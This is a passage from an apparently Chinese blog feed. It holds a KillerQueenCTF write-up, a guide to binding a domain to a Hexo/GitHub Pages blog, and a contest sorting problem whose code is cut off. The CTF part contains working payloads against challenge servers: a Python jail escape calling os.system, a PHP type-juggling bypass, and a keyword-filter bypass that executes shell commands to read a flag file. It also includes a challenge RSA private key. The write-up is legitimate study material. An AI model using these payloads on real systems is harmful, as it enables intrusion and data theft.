Ais+piqHmSrtX6YAnjood9oW2qy6oyBWvA11ipY9ZqfpI2G5Qc9WtViH/Erz2/3S
wFf0J9pgn+iAPbhcGwVh6U/cF+BcQZGse9GaY5Us4SJaQmM0ZdKiYbhKTRGBkudH
60sqeDUCgYEA0mwnrjcDpoc5Kv7qMB4AQCwP6LKnaG5q8Tc86JzYaPEnfUzl4trO
TruiSXmsok8RM/OLdAiIYiazz3GWgxFVNGtv+cEk4AKQnu2iRg5kP4wKBzqhYCnT
gMMMnt2UQfUrPOX7WDHaqQaOxkF06GJeHY7/RMswdOlXWx3w4oo2LJMCgYEA+atH
z0eS+0wzV4lubfpNl/6gi6KJxnpoPJtDt2vJBAa24fbS6ox9bx+Riki/CkpWiGDs
mb2ha1j5580kzDLfJjt1rncCd1iJy+S8zXmX0I1lkmhCnGKjsDDP4nqGmWoHyc9U
HxBYPWd2RtKNcBVDLImxr9IGe74GArU0Q2TmcuMCgYAvtwDEe4sjXvRysH1QTe1G
n/c3kBNwFeHAMwNnx/E20sBepGpYp78ykU+6k5G2+HDxM9/CfxDWGOqbNqmnrO2C
Rn6MxuRiu5Ipx78NXcQTuOCpRP1E/hcM0q3w9FPjJQIZ/BijpiJsQ6VqhXtKGsw2
ra9q3Rxu1l7NtZti825XawKBgHMG2LTE8xDYUKc56Ci/M1SduXXb0sIgzzltB0vQ
WvKB7Ww5/X6Wb4vs7W7aiTnCeg+nKBrE5UPB4JFNUHDL10eUCWnx5q75mbLYlavN
I4awPmWvp1DJmUSpmH1tmenAkgoGfWk6bI0Nx85lX0iOYz53yeeJSfdk2vwQZB3Q
tOOlAoGBAM83orP3tq+o57yvX/v36APtNW7ja7fMnSnmZRuWyJDqCJMNvGRlGObt
hfLludqNeJ4BSJ1nZNqbIvukk8J7DDukrGE5WxP+L1UmuIcTLgOeW7heMEUFbuVG
SpUX47+QBmx6Q8mHa97x/sGidZMlOEBG38bhvfdMgX0pW8zO+Oll
-----END RSA PRIVATE KEY-----
</code></pre>
<p>编写代码,用RSA解密</p>
<pre><code class="python">from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5 as PKCS1_cipher
import base64
c = &#39;Oz5cG3uh6HGoPTsM9yERR2senJ+flkD9dikgzIDimT7xvguYEHGCMvYiD5F5dwbDIlvM7SqYxbzsx5L7+Kfg5OkvrJOMdc7tEsQK7L4n4QSN2mhxVP0AjxpHgufob+MfvL7/36grb6taeW8l5uLUveZ3aPK/XJt35znPScCxTLShFGj0xc/aCxRZYV+oNT6ygyPV4RSGh8v/yeY9bY1wIjYfQLqufKeogcsdBtBXTYQGCX+JQo9NVBLNkU7zQLT+AKit68HkTsORXhjNBFqvj4hQs3jB4rfUt54MKoDDuK0BFrfACKJIQe2LpmBtrVznlyfygIBfmFwrdkHRDi9bdA==&#39;

with open(&#39;a.pem&#39;,&#39;r&#39;) as f:
    pri_key = RSA.importKey(f.read())
    cipher = PKCS1_cipher.new(pri_key)
    plain = cipher.decrypt(base64.b64decode(c), 0)
    print(plain)
</code></pre>
<p><strong>flag:</strong><code>kqctf&#123;y0uv3_6r4du473d_fr0m_r54_m1ddl3_5ch00l_abe7e79e244a9686efc0&#125;</code></p>
<h1 id="Road-Safety-Association"><a href="#Road-Safety-Association" class="headerlink" title="Road_Safety_Association"></a>Road_Safety_Association</h1><p><em>That&#39;s what it stands for, right?</em></p>
<hr>
<p>题目给了c,p,q,e的值,直接求d解密即可<br>代码:</p>
<pre><code class="python">import gmpy2
from Crypto.Util.number import long_to_bytes

c = 34709089913401150635163820358938916881993556790698827096314474131695180194656373592831158701400832173951061153349955626770351918715134102729180082310540500929299260384727841272328651482716425284903562937949838801126975821205390573428889205747236795476232421245684253455346750459684786949905537837807616524618
p = 7049378199874518503065880299491083072359644394572493724131509322075604915964637314839516681795279921095822776593514545854149110798068329888153907702700969
q = 11332855855499101423426736341398808093169269495239972781080892932533129603046914334311158344125602053367004567763440106361963142912346338848213535638676857
e = 65537

n = p * q
phi = (p-1) * (q-1)
d = gmpy2.invert(e, phi)
x = pow(c, d, n)
print(x)
print(long_to_bytes(x))
</code></pre>
<p><strong>flag:</strong><code>kqctf&#123;y0uv3_6r4du473d_fr0m_r54_3l3m3n74ry_5ch00l_ac8770bdcebc&#125;</code></p>
<h1 id="Hammer-To-Fall"><a href="#Hammer-To-Fall" class="headerlink" title="Hammer To Fall"></a>Hammer To Fall</h1><p><em>Dynamically sized integers huh (wrap the proper input in a flag wrapper kqctf{number})</em></p>
<hr>
<p>源文件:</p>
<pre><code class="python">import numpy as np

a = np.array([0], dtype=int)
val = int(input(&quot;This hammer hits so hard it creates negative matter\n&quot;))
if val == -1:
    exit()
a[0] = val
a[0] = (a[0] * 7) + 1
print(a[0])
if a[0] == -1:
    print(&quot;flag!&quot;)
</code></pre>
<p><code>NumPy</code>中的int使用的是C中的long,参照<a href="https://numpy.org/doc/stable/reference/arrays.scalars.html#numpy.int_">NumPy文档</a>,最大值为9223372036854775807</p>
<pre><code class="python">&gt;&gt;&gt; 9223372036854775807 // 7 * 2
2635249153387078802
</code></pre>
<p><strong>flag:</strong><code>kqctf&#123;2635249153387078802&#125;</code></p>
<h1 id="I-want-to-break-free"><a href="#I-want-to-break-free" class="headerlink" title="I want to break free"></a>I want to break free</h1><p><em>I want to break free... from this Python jail. nc 143.198.184.186 45457</em></p>
<hr>
<p>使用<code>&#39;o&#39;+&#39;s&#39;</code>绕过对os的过滤,执行ls命令,发现存在文件<code>cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt</code></p>
<pre><code class="shell">~$ nc 143.198.184.186 45457

    You are in jail. Can you escape?

&gt; __builtins__.__import__(&#39;o&#39;+&#39;s&#39;).system(&#39;ls&#39;)
bin
blacklist.txt
boot
cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt
dev
etc
home
jail.py
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
None
</code></pre>
<p>读取文件内容</p>
<pre><code class="shell">&gt; print(__builtins__.open(&#39;cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt&#39;).read())
kqctf&#123;0h_h0w_1_w4n7_70_br34k_fr33_e73nfk1788234896a174nc&#125;

None
</code></pre>
<p><strong>flag:</strong><code>kqctf&#123;0h_h0w_1_w4n7_70_br34k_fr33_e73nfk1788234896a174nc&#125;</code></p>
<h1 id="sneeki-snek"><a href="#sneeki-snek" class="headerlink" title="sneeki snek"></a>sneeki snek</h1><p><em>ssssssssssssssssssssssssssssssssssssss</em></p>
<hr>
<p>根据字节码还原文件:</p>
<pre><code class="python">f = &#39;&#39;
a = &#39;rwhxi&#125;eomr\\^`Y&#39;
z = &#39;f]XdThbQd^TYL&amp;\x13g&#39;
a = a + z
for i,b in enumerate(a):
    c = ord(b)
    c = c - 7
    c = c+i
    f += chr(c)

print(f)
</code></pre>
<p><strong>flag:</strong><code>kqctf&#123;dont_be_mean_to_snek_:(&#125;</code></p>
<h1 id="sneeki-snek-2-oh-no-what-did-i-do"><a href="#sneeki-snek-2-oh-no-what-did-i-do" class="headerlink" title="sneeki snek 2 oh no what did i do"></a>sneeki snek 2 oh no what did i do</h1><p><em>did snek steal your pasta because this is some spaghetti</em></p>
<hr>
<p>根据字节码还原文件:</p>
<pre><code class="python">a = list()
a.append(1739411)
a.append(1762811)
a.append(1794011)
a.append(1039911)
a.append(1061211)
a.append(1718321)
a.append(1773911)
a.append(1006611)
a.append(1516111)
a.append(1739411)
a.append(1582801)
a.append(1506121)
a.append(1783901)
a.append(1783901)
a.append(1773911)
a.append(1582801)
a.append(1006611)
a.append(1561711)
a.append(1039911)
a.append(1582801)
a.append(1773911)
a.append(1561711)
a.append(1582801)
a.append(1773911)
a.append(1006611)
a.append(1516111)
a.append(1516111)
a.append(1739411)
a.append(1728311)
a.append(1539421)

b = &#39;&#39;
for i in a:
    c = str(i)
    c=c[::-1]
    c= c[:-1]
    c = int(c)
    c = 5 ^ c
    c= c - 55555
    c = c // 555
    b = b + chr(c)
print(b)
</code></pre>
<p><strong>flag:</strong><code>kqctf&#123;snek_waas_not_so_sneeki&#125;</code></p>
<h1 id="Just-Not-My-Type"><a href="#Just-Not-My-Type" class="headerlink" title="Just Not My Type"></a>Just Not My Type</h1><p><em>I really don&#39;t think we&#39;re compatible (<a href="http://143.198.184.186:7000/">Link</a>)</em></p>
<hr>
<p>源文件:</p>
<pre><code class="php+HTML">&lt;h1&gt;I just don&#39;t think we&#39;re compatible&lt;/h1&gt;
&lt;?php
$FLAG = &quot;shhhh you don&#39;t get to see this locally&quot;;
if ($_SERVER[&#39;REQUEST_METHOD&#39;] === &#39;POST&#39;) 
&#123;
    $password = $_POST[&quot;password&quot;];
    if (strcasecmp($password, $FLAG) == 0) &#123;
        echo $FLAG;
    &#125; 
    else &#123;
        echo &quot;That&#39;s the wrong password!&quot;;
    &#125;
&#125;
?&gt;
&lt;form method=&quot;POST&quot;&gt;
    Password
    &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;
    &lt;input type=&quot;submit&quot;&gt;
&lt;/form&gt;
</code></pre>
<p><strong>Payload</strong></p>
<pre><code class="php+HTML">password[]=123
</code></pre>
<p><strong>flag:</strong><code>flag&#123;no_way!_i_took_the_flag_out_of_the_source_before_giving_it_to_you_how_is_this_possible&#125;</code></p>
<h1 id="PHat-Pottomed-Girls"><a href="#PHat-Pottomed-Girls" class="headerlink" title="PHat Pottomed Girls"></a>PHat Pottomed Girls</h1><p><em>Now it&#39;s attempt number 3 and this time with a Queen reference! (flag is in the root directory)</em></p>
<hr>
<p>源文件:</p>
<pre><code class="php+HTML">&lt;?php
session_start();

function generateRandomString($length = 15) &#123;
    $characters = &#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;;
    $charactersLength = strlen($characters);
    $randomString = &#39;&#39;;
    for ($i = 0; $i &lt; $length; $i++) &#123;
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    &#125;
    return $randomString;
&#125;
function filter($originalstring) &#123;
    $notetoadd = str_replace(&quot;&lt;?php&quot;, &quot;&quot;, $originalstring);
    $notetoadd = str_replace(&quot;?&gt;&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;&lt;?&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;flag&quot;, &quot;&quot;, $notetoadd);

    $notetoadd = str_replace(&quot;fopen&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;fread&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;file_get_contents&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;fgets&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;cat&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;strings&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;less&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;more&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;head&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;tail&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;dd&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;cut&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;grep&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;tac&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;awk&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;sed&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;read&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;system&quot;, &quot;&quot;, $notetoadd);

    return $notetoadd;
&#125;

if(isset($_POST[&quot;notewrite&quot;])) &#123;
    $newnote = $_POST[&quot;notewrite&quot;];

    //3rd times the charm and I&#39;ve learned my lesson. Now I&#39;ll make sure to filter more than once :)
    $notetoadd = filter($newnote);
    $notetoadd = filter($notetoadd);
    $notetoadd = filter($notetoadd);

    $filename = generateRandomString();
    array_push($_SESSION[&quot;notes&quot;], &quot;$filename.php&quot;);
    file_put_contents(&quot;$filename.php&quot;, $notetoadd);
    header(&quot;location:index.php&quot;);
&#125;
</code></pre>
<p><strong>Payload</strong></p>
<pre><code class="php+HTML">&lt;&lt;&lt;&lt;&lt;&lt;&lt;?php??php??php??php
 echo `sort /fffflaglaglaglag.php`;
????&gt;&gt;&gt;&gt;
</code></pre>
<p><strong>flag:</strong><code>flag&#123;wait_but_i_fixed_it_after_my_last_two_blunders_i_even_filtered_three_times_:(((&#125;</code></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>KillerQueenCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo+Github pages博客绑定中文域名</title>
    <url>/posts/24787/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>近期又开始了hexo的折腾，在阿里云上买了一个属于自己的域名，因此想着把自己用hexo+Github搭建的博客通过域名访问，于是按照百度上的教程一步一步来绑定域名，结果出现了很多问题 。整个过程可谓一波三折，终于实现了通过域名来访问博客，下面简要介绍一下我绑定域名过程中遇到的问题以及解决方案。</p>
<span id="more"></span>
<h2 id="购买域名"><a href="#购买域名" class="headerlink" title="购买域名"></a>购买域名</h2><p>这里以在<a href="https://www.aliyun.com/">阿里云</a>上购买域名为例,大家也可以去其他平台购买域名。<br>登录阿里云，点击<strong>产品</strong>，选择<strong>域名注册</strong>。<br>注册域名前需查询域名是否已被注册，选择自己喜欢的域名，支付即可。<br><img data-src="/images/20180213014855.jpg"><br>一般来说，.top与.xyz结尾的域名都比较便宜。为了节约成本，我买的.top结尾的域名，一年只需两块钱，很便宜。</p>
<h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><p>购买域名后，我们依次点击个人昵称-&gt;域名与网站(万网)-&gt;域名，进入管理控制台，在这里我们可以看到自己购买的域名,点击<strong>解析</strong>，进入解析设置。<br><img data-src="/images/20180212235815.jpg"><br>点击添加解析，依次输入：<strong>CNAME、@、Github博客地址</strong>，点击<strong>确定</strong>，完成个人域名向个人博客的映射。<br><img data-src="/images/20180212230359.jpg"></p>
<div class="note warning"><p>注意：这里填入博客地址的时候无需填写https:// ，只需按照example.github.io格式填写就行了。
</p></div>

<h2 id="创建CNAME文件"><a href="#创建CNAME文件" class="headerlink" title="创建CNAME文件"></a>创建CNAME文件</h2><p>在本地的根目录下的source文件夹中新建一个名为<strong>CNAME</strong>的文本文件，文件内容为<strong>个人域名</strong>（没有http:&#x2F;&#x2F; ,也没有www.）,然后重命名删除该文件的后缀名:<strong>.txt</strong>。<br>使用<code>hexo d -g</code>命令部署博客，这时在浏览器中输入新注册的域名，已经可以正常的访问博客了。</p>
<h3 id="英文域名"><a href="#英文域名" class="headerlink" title="英文域名"></a>英文域名</h3><p>英文域名就直接写:<code>example.con</code></p>
<h3 id="中文域名"><a href="#中文域名" class="headerlink" title="中文域名"></a>中文域名</h3><p>中文域名的话,则需先将中文域名转换为<strong>Punycode标准编码的字符串</strong>:<a href="http://www.dh.vg/tools/zm.php">中文域名转换Punycode标准编码工具</a><br>For example:<br><code>例子.中文</code>经过转换为<code>xn--fsqu00a.xn--fiq228c</code><br>将<code>xn--****.xn--***</code>填入<strong>CNAME</strong>文件即可。</p>
<div class="note danger"><p>如果直接在CNAME文件中填写中文域名,则Github会通过邮件提醒你:
The CNAME xxx.com is not properly formatted. See https://help.github.com/articles/troubleshooting-custom-domains/#github-repository-setup-errors for more information.
</p></div>
## LeanCloud数据丢失
通过域名访问博客，发现文章的阅读次数不显示，于是各种折腾：检查元素、谷歌，最后发现是由于没有将新注册的域名加入到LeanCloud设置中的**Web 安全域名**,导致无法调用服务器资源。
解决方案：访问：[LeanCloud官网](https://leancloud.cn),进入**控制台**，在设置中点击**安全中心**，将新注册的域名加入到**Web安全域名**中，点击**保存**即可。
![](/images/20180213013700.jpg)

<h2 id="busuanzi数据丢失"><a href="#busuanzi数据丢失" class="headerlink" title="busuanzi数据丢失"></a>busuanzi数据丢失</h2><p>无论是通过域名还是github地址访问博客，博客底部的统计浏览量与浏览人次均不是以前的数据，而是从头开始计算....<br>busuanzi还不具备统初始值的功能，只能从头开始计算了。。。</p>
<h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><h3 id="中文域名-1"><a href="#中文域名-1" class="headerlink" title="中文域名"></a>中文域名</h3><p>１、一类是域名后缀为英文字母的国际中文域名和别国中文域名，比如：中文.com，中文.net，中文.biz，中文.cc，中文.hk，中文.tm，中文.tv，中文.tw；<br>２、一类是域名后缀为中文的纯中文国内中文域名，比如：中文域名.中国，中文域名.公司，中文域名.网络；<br>中文域名在解析的时候，需要先转换为 xn--fiq228c.com或xn--fiq228c.cn形式的ASCII码，这种编码称为PunyCode。纯中文域名不被标准的解析服务器支持，要实现对这种纯中文域名的正确访问，ISP需要做相应的修改，以便能够正确解析中文域名。同时CNNIC也提供了专用服务器，用户只要将浏览器的DNS设置指向这台服务器，它同样可以完成对纯中文域名的正确解析。另外，考虑到现在有些ISP还没有做修改，而有些用户又不方便将DNS设置指向CNNIC提供的服务器，纯中文域名会被加上.cn后缀，即对每一个纯中文域名同时有两种形式：纯中文域名和纯中文域名.CN， 如：&quot;中文域名.网络&quot;和&quot;中文域名.网络.CN&quot;。这样即使ISP还没有做相应的修改，用户也可以正确使用中文域名。</p>
<h3 id="PunyCode"><a href="#PunyCode" class="headerlink" title="PunyCode"></a>PunyCode</h3><p>英文域名在IIS或Apache中的虚拟主机设置，可以直接使用英文域名，如webmasterhome.cn。<br>中文域名在IIS或Apache中应如何设置主机头呢？如&quot;中国站长之家.com&quot;。<br>1、在进行设置之前要先把中文域名转化成为PunyCode编码，然后在主机头设置里面填上中文域名所对应的PunyCode编码(｀xn--fiqsC146Ah4ex80Cro7A.com｀)便可。<br>新的国际化域名的标准在网域名称编码上，为了保留向下兼容性及不影响现有的应用程序协议，因此将多国语言域名转成ASCII编码，而这种编码称为『punycode』。<br>因为经过Nameprep处理过的国际化域名是以 Unicode 序列的形式表示的。但现有的 DNS系统只支持用 ASCII字符表示的域名，所以要对Unicode序列进行 ACE(ASCII-compatible encoding)编码，把 Unicode序列表示的域名转换成 ASCII 字符串表示的ACE域名。<br>2、PunyCode是一种专为国际化域名而设计的高效ACE编码方式。它可以在Unicode序列和ASCII 字符串之间进行唯一的和可逆的转换。转换的过程中，Unicode 序列中的ASCII字符保持不变，国际化字符则用字母和数字来表示。它的实质是一种用数量有限的基本字符(字母和数字)来唯一地表示大字符集(Unicode)中的字符的通用算法。域名中的字符，包括 ASCII 码和 Unicode 码，都是作为整数进行处理。<br>PunyCode则是将一个经过Nameprep处理过的IDN，从一个8位的编码的形式转换为7位编码的形式。目前Internet DNS一向是7位ASCII编码的环境，经过这个PunyCode转码程序，便将IDN从一个8位的IDN转换为与现有DNS环境兼容的编码。<br>3、在DNS服务器方面，需要将IDN以PunyCode的编码形式来设定。因为PunyCode本身就是一种7位的编码，与ASCII编码完全兼容，所以可适用设定于目前所有可用的DNS版本,也就是说可以不需要为了设定PunyCode而重新安装BIND新版本。但是若是需要使用DNAME指令来设定资源记录(Resource Record)，则需先提升为BIND9的版本。</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title>L2-3.名人堂与代金券</title>
    <url>/posts/45393/</url>
    <content><![CDATA[<h2 id="题目内容"><a href="#题目内容" class="headerlink" title="题目内容"></a>题目内容</h2><p>对于在中国大学MOOC(<a href="http://www.icourse163.org/">http://www.icourse163.org/</a>) 学习“数据结构”课程的学生，想要获得一张合格证书，总评成绩必须达到 60 分及以上，并且有另加福利：总评分在 [G, 100] 区间内者，可以得到 50 元 PAT 代金券；在 [60, G) 区间内者，可以得到 20 元PAT代金券。全国考点通用，一年有效。同时任课老师还会把总评成绩前 K 名的学生列入课程“名人堂”。本题就请你编写程序，帮助老师列出名人堂的学生，并统计一共发出了面值多少元的 PAT 代金券。</p>
<span id="more"></span>
<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>输入在第一行给出 3 个整数，分别是 N（不超过 10 000 的正整数，为学生总数）、G（在 (60,100) 区间内的整数，为题面中描述的代金券等级分界线）、K（不超过 100 且不超过 N 的正整数，为进入名人堂的最低名次）。接下来 N 行，每行给出一位学生的账号（长度不超过15位、不带空格的字符串）和总评成绩（区间 [0, 100] 内的整数），其间以空格分隔。题目保证没有重复的账号。 </p>
<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>首先在一行中输出发出的 PAT 代金券的总面值。然后按总评成绩非升序输出进入名人堂的学生的名次、账号和成绩，其间以 1 个空格分隔。需要注意的是：成绩相同的学生享有并列的排名，排名并列时，按账号的字母序升序输出。</p>
<h2 id="输入样例"><a href="#输入样例" class="headerlink" title="输入样例"></a>输入样例</h2><div class="note default no-icon"><p>
10 80 5
cy@zju.edu.cn 78
cy@pat-edu.com 87
1001@qq.com 65
uh-oh@163.com 96
test@126.com 39
anyone@qq.com 87
zoe@mit.edu 80
jack@ucla.edu 88
bob@cmu.edu 80
ken@163.com 70
</p></div>

<h2 id="输出样例"><a href="#输出样例" class="headerlink" title="输出样例"></a>输出样例</h2><div class="note default no-icon"><p>
360
1 uh-oh@163.com 96
2 jack@ucla.edu 88
3 anyone@qq.com 87
3 cy@pat-edu.com 87
5 bob@cmu.edu 80
5 zoe@mit.edu 80
</p></div>

<p><strong>时间限制：150ms内存限制：65536kb</strong></p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>用一个结构体来存姓名和成绩，再用自定义的比较函数sort一下。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">stu</span></span><br><span class="line">&#123;</span><br><span class="line">    string name;</span><br><span class="line">    <span class="type">int</span> grade;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(<span class="type">const</span> stu&amp; s1, <span class="type">const</span> stu&amp; s2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s<span class="number">1.</span>grade != s<span class="number">2.</span>grade)</span><br><span class="line">        <span class="keyword">return</span> s<span class="number">1.</span>grade &gt; s<span class="number">2.</span>grade;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> s<span class="number">1.</span>name &lt; s<span class="number">2.</span>name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;in.txt&quot;, &quot;r&quot;, stdin);</span></span><br><span class="line">    <span class="comment">//freopen(&quot;out.txt&quot;, &quot;w&quot;, stdout);</span></span><br><span class="line">    cin.<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    <span class="type">int</span> n, g, k;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; g &gt;&gt; k;</span><br><span class="line">    vector&lt;stu&gt; v;</span><br><span class="line">    ll ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        string temp1;</span><br><span class="line">        <span class="type">int</span> temp2;</span><br><span class="line">        cin &gt;&gt; temp1 &gt;&gt; temp2;</span><br><span class="line">        stu temp;</span><br><span class="line">        temp.name = temp1;</span><br><span class="line">        temp.grade = temp2;</span><br><span class="line">        v.<span class="built_in">push_back</span>(temp);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(temp2 &gt;= <span class="number">60</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(temp2 &lt; g)</span><br><span class="line">                ans += <span class="number">20</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                ans += <span class="number">50</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> index = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> number = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">sort</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), cmp);</span><br><span class="line">    vector&lt;stu&gt;::iterator t;</span><br><span class="line">    ll flag = v[<span class="number">0</span>].grade;</span><br><span class="line">    <span class="keyword">for</span>(t = v.<span class="built_in">begin</span>(); t != v.<span class="built_in">end</span>(); t++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(flag != (*t).grade)</span><br><span class="line">        &#123;</span><br><span class="line">            flag = (*t).grade;</span><br><span class="line">            index = number;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(index &gt; k)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        cout &lt;&lt; index &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; (*t).name &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; (*t).grade &lt;&lt; endl;</span><br><span class="line">        number++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>用一个map&lt;string,name&gt;来存name和grade,将map转存到vcetor到中进行排序。<br>比赛的时候好蠢好蠢的做法，后面会说。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span> <span class="params">(<span class="type">const</span> pair&lt;string,<span class="type">int</span>&gt;&amp; a,<span class="type">const</span> pair&lt;string,<span class="type">int</span>&gt;&amp; b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a.second!=b.second)</span><br><span class="line">        <span class="keyword">return</span> a.second&gt;b.second;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> a.first&lt;b.first;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;in.txt&quot;, &quot;r&quot;, stdin);</span></span><br><span class="line">    <span class="comment">//freopen(&quot;out.txt&quot;, &quot;w&quot;, stdout);</span></span><br><span class="line">    cin.<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    <span class="type">int</span> n,g,k;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;g&gt;&gt;k;</span><br><span class="line">    map&lt;string,<span class="type">int</span>&gt; m;</span><br><span class="line">    ll ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        string temp1;</span><br><span class="line">        <span class="type">int</span> temp2;</span><br><span class="line">        cin&gt;&gt;temp1&gt;&gt;temp2;</span><br><span class="line">        m.<span class="built_in">insert</span>(<span class="built_in">pair</span>&lt;string,<span class="type">int</span>&gt;(temp1,temp2));</span><br><span class="line">        <span class="keyword">if</span>(temp2&gt;=<span class="number">60</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(temp2&lt;g)</span><br><span class="line">                ans+=<span class="number">20</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                ans+=<span class="number">50</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    vector&lt;pair&lt;string,<span class="type">int</span>&gt;&gt; <span class="built_in">mm</span>(m.<span class="built_in">begin</span>(),m.<span class="built_in">end</span>());<span class="comment">//map转存至vector</span></span><br><span class="line">    <span class="built_in">sort</span>(mm.<span class="built_in">begin</span>(),mm.<span class="built_in">end</span>(),cmp);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> 